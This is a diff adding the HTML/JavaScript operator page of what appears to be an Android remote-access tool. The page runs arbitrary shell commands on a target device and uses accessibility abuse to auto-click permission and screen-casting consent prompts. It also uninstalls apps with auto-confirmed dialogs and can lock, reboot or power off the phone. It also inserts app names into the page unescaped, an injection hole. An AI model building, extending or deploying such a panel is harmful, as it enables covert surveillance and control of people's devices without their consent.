@@ -1,0 +1,932 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Shell Terminal - Remote Access</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/css/hacker-theme.css">
+    <style>
+        /* ===== LAYOUT ===== */
+        body {
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            padding: 0;
+            margin: 0;
+        }
+
+        body::before {
+            display: none;
+        }
+
+        /* ===== SIDEBAR ===== */
+        .sidebar {
+            width: 260px;
+            min-width: 260px;
+            background: var(--bg-panel);
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            overflow-x: hidden;
+            z-index: 200;
+        }
+
+        .sidebar::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        .sidebar::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .sidebar::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 2px;
+        }
+
+        .sidebar-header {
+            padding: 14px 14px;
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            background: var(--bg-panel);
+            z-index: 5;
+        }
+
+        .sidebar-header h2 {
+            font-size: 0.8rem;
+            color: var(--accent);
+            letter-spacing: 2px;
+            margin: 0;
+        }
+
+        .category {
+            padding: 10px 14px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .category-title {
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+        }
+
+        .cmd-btn {
+            display: block;
+            width: 100%;
+            padding: 8px 10px;
+            margin-bottom: 4px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            color: var(--text-primary);
+            font-family: inherit;
+            font-size: 0.75rem;
+            cursor: pointer;
+            text-align: left;
+            transition: all 0.15s;
+        }
+
+        .cmd-btn:hover {
+            border-color: var(--accent);
+            background: rgba(0, 255, 65, 0.05);
+        }
+
+        .cmd-btn:active {
+            transform: scale(0.97);
+        }
+
+        .cmd-btn.primary {
+            border-color: rgba(0, 255, 65, 0.2);
+            color: var(--accent);
+        }
+
+        .cmd-btn.primary:hover {
+            background: rgba(0, 255, 65, 0.12);
+            box-shadow: 0 0 10px var(--accent-glow);
+        }
+
+        .cmd-btn.danger {
+            border-color: rgba(255, 51, 51, 0.25);
+            color: var(--danger);
+        }
+
+        .cmd-btn.danger:hover {
+            background: rgba(255, 51, 51, 0.12);
+            border-color: rgba(255, 51, 51, 0.5);
+            box-shadow: 0 0 10px var(--danger-glow);
+        }
+
+        /* ===== APP PANEL ===== */
+        .app-panel-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 1999;
+        }
+
+        .app-panel-overlay.active {
+            display: block;
+        }
+
+        .app-panel {
+            position: fixed;
+            top: 0;
+            right: -420px;
+            width: 400px;
+            max-width: 90vw;
+            height: 100vh;
+            background: var(--bg-secondary);
+            border-left: 1px solid var(--border);
+            z-index: 2000;
+            display: flex;
+            flex-direction: column;
+            transition: right 0.3s ease;
+        }
+
+        .app-panel.open {
+            right: 0;
+        }
+
+        .app-panel-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .app-panel-header h2 {
+            font-size: 1rem;
+            color: var(--accent);
+            margin: 0;
+        }
+
+        .app-panel-close {
+            background: none;
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            font-size: 1.1rem;
+            cursor: pointer;
+            padding: 4px 10px;
+            border-radius: 4px;
+        }
+
+        .app-panel-close:hover {
+            color: var(--danger);
+            border-color: var(--danger);
+        }
+
+        .app-search-box {
+            padding: 12px 20px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .app-search-box input {
+            width: 100%;
+            padding: 8px 12px;
+            background: var(--bg-primary);
+            border: 1px solid var(--border);
+            color: var(--text-primary);
+            border-radius: 6px;
+            font-family: var(--font);
+            font-size: 0.85rem;
+            box-sizing: border-box;
+        }
+
+        .app-search-box input:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+
+        .app-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 8px 12px;
+        }
+
+        .app-loading {
+            text-align: center;
+            color: var(--text-secondary);
+            padding: 40px 0;
+        }
+
+        .app-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 12px;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            margin-bottom: 6px;
+            gap: 10px;
+        }
+
+        .app-item:hover {
+            border-color: rgba(0, 255, 65, 0.3);
+        }
+
+        .app-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .app-name {
+            color: var(--text-primary);
+            font-size: 0.85rem;
+            font-weight: 600;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .app-package {
+            color: var(--text-secondary);
+            font-size: 0.7rem;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .app-actions {
+            display: flex;
+            gap: 6px;
+            flex-shrink: 0;
+        }
+
+        .app-btn {
+            padding: 4px 10px;
+            border: 1px solid var(--border);
+            background: transparent;
+            color: var(--text-secondary);
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.75rem;
+            font-family: var(--font);
+        }
+
+        .app-btn:hover {
+            color: var(--accent);
+            border-color: var(--accent);
+        }
+
+        .app-btn.uninstall:hover {
+            color: var(--danger);
+            border-color: var(--danger);
+        }
+
+        .app-count {
+            text-align: center;
+            padding: 8px;
+            color: var(--text-secondary);
+            font-size: 0.75rem;
+            border-bottom: 1px solid var(--border);
+        }
+
+        /* ===== MAIN CONTENT ===== */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            min-width: 0;
+            overflow: hidden;
+        }
+
+        /* ===== HEADER ===== */
+        header {
+            padding: 10px 16px;
+            background: var(--bg-panel);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-shrink: 0;
+        }
+
+        header::before {
+            display: none;
+        }
+
+        header h1 {
+            font-size: 0.95rem;
+            letter-spacing: 1px;
+            margin: 0;
+            color: var(--text-primary);
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-toggle {
+            padding: 4px 10px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            color: var(--text-primary);
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-family: inherit;
+            transition: all 0.15s;
+        }
+
+        .btn-toggle:hover {
+            border-color: var(--accent);
+        }
+
+        .back-link {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 0.75rem;
+            letter-spacing: 0.5px;
+            transition: color 0.2s;
+        }
+
+        .back-link:hover {
+            color: var(--accent);
+        }
+
+        /* ===== TERMINAL ===== */
+        .terminal-container {
+            flex: 1;
+            overflow-y: auto;
+            overflow-x: hidden;
+            padding: 12px 16px;
+            background: #000;
+            font-size: 0.8rem;
+            line-height: 1.6;
+        }
+
+        .terminal-container::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .terminal-container::-webkit-scrollbar-track {
+            background: #000;
+        }
+
+        .terminal-container::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 3px;
+        }
+
+        /* ===== OUTPUT LINES ===== */
+        .output-line {
+            color: var(--text-primary);
+            white-space: pre-wrap;
+            word-break: break-all;
+            padding: 1px 0;
+            font-family: 'Share Tech Mono', monospace;
+        }
+
+        .command-line {
+            color: var(--accent);
+            font-weight: bold;
+            padding: 4px 0 2px 0;
+            margin-top: 4px;
+            border-top: 1px solid rgba(0, 255, 65, 0.08);
+        }
+
+        .command-line .timestamp {
+            color: var(--text-muted);
+            font-weight: normal;
+            font-size: 0.7rem;
+            margin-right: 6px;
+        }
+
+        .error-line {
+            color: var(--danger);
+        }
+
+        .info-line {
+            color: var(--text-secondary);
+            font-style: italic;
+        }
+
+        /* ===== INPUT AREA ===== */
+        .input-area {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 16px;
+            background: var(--bg-panel);
+            border-top: 1px solid var(--border);
+            flex-shrink: 0;
+        }
+
+        .prompt {
+            color: var(--accent);
+            font-weight: bold;
+            font-size: 1rem;
+            flex-shrink: 0;
+        }
+
+        .input-area input {
+            flex: 1;
+            padding: 10px 12px;
+            background: var(--bg-input, #0d1117);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text-primary);
+            font-family: inherit;
+            font-size: 0.85rem;
+            min-width: 0;
+        }
+
+        .input-area input:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 8px var(--accent-glow);
+        }
+
+        .input-area input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .btn-exec {
+            padding: 10px 18px;
+            background: rgba(0, 255, 65, 0.12);
+            border: 1px solid rgba(0, 255, 65, 0.25);
+            border-radius: 6px;
+            color: var(--accent);
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 0.8rem;
+            font-weight: bold;
+            letter-spacing: 1px;
+            transition: all 0.15s;
+            flex-shrink: 0;
+        }
+
+        .btn-exec:hover {
+            background: rgba(0, 255, 65, 0.2);
+            border-color: var(--accent);
+            box-shadow: 0 0 12px var(--accent-glow);
+        }
+
+        .btn-exec:active {
+            transform: scale(0.96);
+        }
+
+        /* ===== RESPONSIVE: TABLET ===== */
+        @media (max-width: 1024px) {
+            .sidebar {
+                width: 220px;
+                min-width: 220px;
+            }
+        }
+
+        /* ===== RESPONSIVE: MOBILE ===== */
+        @media (max-width: 768px) {
+            .sidebar {
+                position: fixed;
+                top: 0;
+                left: 0;
+                bottom: 0;
+                width: 280px;
+                transform: translateX(-100%);
+                transition: transform 0.25s ease;
+                box-shadow: 4px 0 20px rgba(0, 0, 0, 0.5);
+            }
+
+            .sidebar.open {
+                transform: translateX(0);
+            }
+
+            .sidebar-overlay {
+                display: none;
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background: rgba(0, 0, 0, 0.5);
+                z-index: 199;
+            }
+
+            .sidebar-overlay.active {
+                display: block;
+            }
+
+            .terminal-container {
+                font-size: 0.75rem;
+                padding: 10px 12px;
+            }
+
+            .input-area {
+                padding: 8px 10px;
+                gap: 6px;
+            }
+
+            .input-area input {
+                padding: 9px 10px;
+                font-size: 0.8rem;
+            }
+
+            .btn-exec {
+                padding: 9px 14px;
+                font-size: 0.75rem;
+            }
+        }
+
+        /* ===== RESPONSIVE: SMALL MOBILE ===== */
+        @media (max-width: 480px) {
+            header h1 {
+                font-size: 0.8rem;
+            }
+
+            .terminal-container {
+                font-size: 0.7rem;
+                padding: 8px 10px;
+            }
+
+            .output-line,
+            .command-line {
+                font-size: 0.7rem;
+            }
+
+            .input-area input {
+                padding: 8px;
+                font-size: 0.75rem;
+            }
+
+            .btn-exec {
+                padding: 8px 12px;
+                font-size: 0.7rem;
+                letter-spacing: 0;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- SIDEBAR OVERLAY (mobile) -->
+    <div class="sidebar-overlay" id="sidebar-overlay"></div>
+
+    <!-- SIDEBAR -->
+    <aside class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <h2>⌘ QUICK CMDS</h2>
+        </div>
+
+        <!-- Category: Accessibility -->
+        <div class="category">
+            <div class="category-title">Accessibility (No Root)</div>
+            <button class="cmd-btn primary" onclick="populate('acc click &quot;Allow&quot;')">Accept Permission</button>
+            <button class="cmd-btn primary" onclick="populate('acc click &quot;While using the app&quot;')">While Using
+                App</button>
+            <button class="cmd-btn primary" onclick="populate('acc click &quot;Start now&quot;')">Start Casting</button>
+            <button class="cmd-btn" onclick="populate('acc click &quot;TEXT_HERE&quot;')">Custom Click...</button>
+        </div>
+
+        <!-- Category: Files -->
+        <div class="category">
+            <div class="category-title">File Operations</div>
+            <button class="cmd-btn" onclick="run('ls -la /sdcard')">List /sdcard</button>
+            <button class="cmd-btn" onclick="run('pwd')">Current Dir</button>
+            <button class="cmd-btn" onclick="populate('cat /sdcard/')">Read File...</button>
+            <button class="cmd-btn" onclick="populate('mkdir /sdcard/')">Make Dir...</button>
+        </div>
+
+        <!-- Category: System -->
+        <div class="category">
+            <div class="category-title">System Diagnostics</div>
+            <button class="cmd-btn" onclick="run('getprop ro.product.model && getprop ro.build.version.release')">Device
+                Info</button>
+            <button class="cmd-btn" onclick="run('df -h')">Disk Usage</button>
+            <button class="cmd-btn" onclick="run('ps -A')">Process List</button>
+            <button class="cmd-btn" onclick="run('top -n 1')">CPU Usage</button>
+        </div>
+
+        <!-- Category: Network -->
+        <div class="category">
+            <div class="category-title">Network</div>
+            <button class="cmd-btn" onclick="run('ip addr show wlan0')">IP Address</button>
+            <button class="cmd-btn" onclick="run('ping -c 3 google.com')">Ping Google</button>
+            <button class="cmd-btn" onclick="run('netstat -an | grep LISTEN')">Open Ports</button>
+        </div>
+
+        <!-- Category: Power Control -->
+        <div class="category">
+            <div class="category-title">Power Control</div>
+            <button class="cmd-btn primary" onclick="sendPowerCommand('power_sleep')">💤 Sleep (Screen Off)</button>
+            <button class="cmd-btn primary" onclick="sendPowerCommand('power_wakeup')">☀️ Wake Up</button>
+            <button class="cmd-btn danger" onclick="sendPowerCommand('power_lock')">🔒 Lock Screen</button>
+            <button class="cmd-btn danger" onclick="confirmPower('power_reboot', '🔄 Restart device?')">🔄
+                Restart</button>
+            <button class="cmd-btn danger" onclick="confirmPower('power_off', '⛔ Power off device?')">⛔ Power
+                Off</button>
+        </div>
+
+        <!-- Tools -->
+        <div class="category">
+            <div class="category-title">Tools</div>
+            <button class="cmd-btn primary" id="btn-apps">📱 App Manager</button>
+            <button class="cmd-btn" id="btn-clear">🗑 Clear Terminal</button>
+        </div>
+    </aside>
+
+    <!-- APP MANAGER PANEL -->
+    <div class="app-panel-overlay" id="app-panel-overlay"></div>
+    <div class="app-panel" id="app-panel">
+        <div class="app-panel-header">
+            <h2>📱 App Manager</h2>
+            <button class="app-panel-close" id="btn-close-apps">✕</button>
+        </div>
+        <div class="app-search-box">
+            <input type="text" id="app-search" placeholder="Search apps..." autocomplete="off">
+        </div>
+        <div class="app-list" id="app-list">
+            <div class="app-loading">Loading apps...</div>
+        </div>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div class="main-content">
+        <header>
+            <div class="header-left">
+                <button class="btn-toggle" id="btn-sidebar" title="Toggle Sidebar">☰</button>
+                <h1>REMOTE SHELL</h1>
+            </div>
+            <a href="index.html" class="back-link">← Dashboard</a>
+        </header>
+
+        <div class="terminal-container" id="terminal">
+            <!-- Output goes here -->
+        </div>
+
+        <div class="input-area">
+            <span class="prompt">$</span>
+            <input type="text" id="command-input" placeholder="Enter command..." autofocus autocomplete="off" />
+            <button class="btn-exec" id="btn-execute">EXEC</button>
+        </div>
+    </div>
+
+    <script src="/js/api.js"></script>
+    <script>
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+        const terminal = document.getElementById('terminal');
+        const commandInput = document.getElementById('command-input');
+        const sidebar = document.getElementById('sidebar');
+        const sidebarOverlay = document.getElementById('sidebar-overlay');
+        const commandHistory = [];
+        let historyIndex = -1;
+
+        if (!deviceId) {
+            window.location.href = 'index.html';
+        }
+
+        // --- Core Functions ---
+
+        function addOutput(text, type = 'output') {
+            const line = document.createElement('div');
+            line.className = type === 'error' ? 'output-line error-line' :
+                type === 'command' ? 'command-line' :
+                    type === 'info' ? 'output-line info-line' : 'output-line';
+
+            if (type === 'command') {
+                const ts = new Date().toLocaleTimeString();
+                line.innerHTML = `<span class="timestamp">[${ts}]</span> ${text}`;
+            } else {
+                line.textContent = text;
+            }
+
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        async function executeCommand(command) {
+            if (!command || !command.trim()) return;
+
+            // Add to history
+            commandHistory.push(command);
+            historyIndex = commandHistory.length;
+
+            addOutput(`$ ${command}`, 'command');
+
+            try {
+                const result = await api.sendCommand(deviceId, 'shell_exec', { command });
+
+                if (result.status === 'timeout') {
+                    addOutput(`[Timeout] ${result.error}`, 'error');
+                } else if (result.output) {
+                    addOutput(result.output);
+                } else if (result.stdout || result.stderr) {
+                    if (result.stdout) addOutput(result.stdout);
+                    if (result.stderr) addOutput(result.stderr, 'error');
+                } else {
+                    addOutput('(Command executed - no output)', 'info');
+                }
+            } catch (error) {
+                addOutput(`Error: ${error.message}`, 'error');
+            }
+        }
+
+        // --- Toolbar Helpers ---
+
+        window.populate = function (cmd) {
+            commandInput.value = cmd;
+            commandInput.focus();
+            closeSidebar();
+        }
+
+        window.run = function (cmd) {
+            executeCommand(cmd);
+            closeSidebar();
+        }
+
+        // --- Power Control ---
+
+        async function sendPowerCommand(action) {
+            addOutput(`⚡ ${action}`, 'command');
+            closeSidebar();
+            try {
+                const result = await api.sendCommand(deviceId, action, {});
+                addOutput(result.message || `${action} executed`, 'info');
+            } catch (error) {
+                addOutput(`Error: ${error.message}`, 'error');
+            }
+        }
+
+        window.confirmPower = function (action, msg) {
+            if (confirm(msg)) {
+                sendPowerCommand(action);
+            }
+        }
+
+        // --- App Manager ---
+
+        let allApps = [];
+
+        function openAppPanel() {
+            document.getElementById('app-panel').classList.add('open');
+            document.getElementById('app-panel-overlay').classList.add('active');
+            closeSidebar();
+            loadApps();
+        }
+
+        function closeAppPanel() {
+            document.getElementById('app-panel').classList.remove('open');
+            document.getElementById('app-panel-overlay').classList.remove('active');
+        }
+
+        async function loadApps() {
+            const appList = document.getElementById('app-list');
+            appList.innerHTML = '<div class="app-loading">Loading apps...</div>';
+            try {
+                const result = await api.sendCommand(deviceId, 'apps_list', {});
+                // result = { success, data: { status, data: [...apps], count } }
+                const appData = result.data || result;
+                allApps = appData.data || [];
+                renderApps(allApps);
+            } catch (error) {
+                appList.innerHTML = `<div class="app-loading">Error: ${error.message}</div>`;
+            }
+        }
+
+        function renderApps(apps) {
+            const appList = document.getElementById('app-list');
+            if (!apps.length) {
+                appList.innerHTML = '<div class="app-loading">No apps found</div>';
+                return;
+            }
+            const sorted = apps.sort((a, b) => a.name.localeCompare(b.name));
+            appList.innerHTML = `<div class="app-count">${sorted.length} apps</div>` +
+                sorted.map(app => `
+                    <div class="app-item">
+                        <div class="app-info">
+                            <div class="app-name">${app.name}</div>
+                            <div class="app-package">${app.package} v${app.version}</div>
+                        </div>
+                        <div class="app-actions">
+                            <button class="app-btn" onclick="launchApp('${app.package}')">Launch</button>
+                            <button class="app-btn uninstall" onclick="uninstallApp('${app.package}', '${app.name.replace(/'/g, "\\'")}')">Uninstall</button>
+                        </div>
+                    </div>
+                `).join('');
+        }
+
+        async function launchApp(pkg) {
+            try {
+                await api.sendCommand(deviceId, 'app_launch', { package: pkg });
+                addOutput(`Launched: ${pkg}`, 'info');
+            } catch (e) {
+                addOutput(`Launch failed: ${e.message}`, 'error');
+            }
+        }
+
+        async function uninstallApp(pkg, name) {
+            if (!confirm(`Uninstall "${name}"?\n\nPackage: ${pkg}\n\nThis will open the uninstall dialog on the device and auto-confirm after 3s.`)) return;
+            try {
+                addOutput(`Uninstalling: ${pkg}`, 'command');
+                const result = await api.sendCommand(deviceId, 'app_uninstall', { package: pkg });
+                addOutput(result.message || 'Uninstall dialog triggered', 'info');
+                // Auto-confirm the uninstall dialog after 3 seconds
+                setTimeout(async () => {
+                    try {
+                        await api.sendCommand(deviceId, 'accessibility_key', { key: 'ENTER' });
+                    } catch (e) { }
+                }, 3000);
+                // Reload app list after 5s
+                setTimeout(() => loadApps(), 5000);
+            } catch (e) {
+                addOutput(`Uninstall failed: ${e.message}`, 'error');
+            }
+        }
+
+        document.getElementById('app-search').addEventListener('input', (e) => {
+            const q = e.target.value.toLowerCase();
+            const filtered = allApps.filter(a => a.name.toLowerCase().includes(q) || a.package.toLowerCase().includes(q));
+            renderApps(filtered);
+        });
+
+        document.getElementById('btn-apps').addEventListener('click', openAppPanel);
+        document.getElementById('btn-close-apps').addEventListener('click', closeAppPanel);
+        document.getElementById('app-panel-overlay').addEventListener('click', closeAppPanel);
+
+        // --- Sidebar Toggle ---
+
+        function openSidebar() {
+            sidebar.classList.add('open');
+            sidebarOverlay.classList.add('active');
+        }
+
+        function closeSidebar() {
+            sidebar.classList.remove('open');
+            sidebarOverlay.classList.remove('active');
+        }
+
+        function toggleSidebar() {
+            // On desktop, use display toggle; on mobile, use slide
+            if (window.innerWidth <= 768) {
+                sidebar.classList.contains('open') ? closeSidebar() : openSidebar();
+            } else {
+                // Desktop: toggle visibility
+                if (sidebar.style.display === 'none') {
+                    sidebar.style.display = 'flex';
+                } else {
+                    sidebar.style.display = 'none';
+                }
+            }
+        }
+
+        // --- Event Listeners ---
+
+        document.getElementById('btn-execute').addEventListener('click', () => {
+            const command = commandInput.value;
+            executeCommand(command);
+            commandInput.value = '';
+        });
+
+        document.getElementById('btn-clear').addEventListener('click', () => {
+            terminal.innerHTML = '';
+            addOutput('Terminal cleared.', 'info');
+        });
+
+        document.getElementById('btn-sidebar').addEventListener('click', toggleSidebar);
+
+        sidebarOverlay.addEventListener('click', closeSidebar);
+
+        // Input History (Up/Down) & Enter
+        commandInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const command = commandInput.value;
+                executeCommand(command);
+                commandInput.value = '';
+            } else if (e.key === 'ArrowUp') {
+                e.preventDefault();
+                if (historyIndex > 0) {
+                    historyIndex--;
+                    commandInput.value = commandHistory[historyIndex];
+                }
+            } else if (e.key === 'ArrowDown') {
+                e.preventDefault();
+                if (historyIndex < commandHistory.length - 1) {
+                    historyIndex++;
+                    commandInput.value = commandHistory[historyIndex];
+                } else {
+                    historyIndex = commandHistory.length;
+                    commandInput.value = '';
+                }
+            }
+        });
+
+        // Initial connection message
+        addOutput('=== Remote Shell Terminal ===', 'info');
+        addOutput(`Connected to: ${deviceId}`, 'info');
+        addOutput('Type commands or use ☰ Quick Menu.', 'info');
+        addOutput('');
+
+    </script>
+</body>
+
+</html>
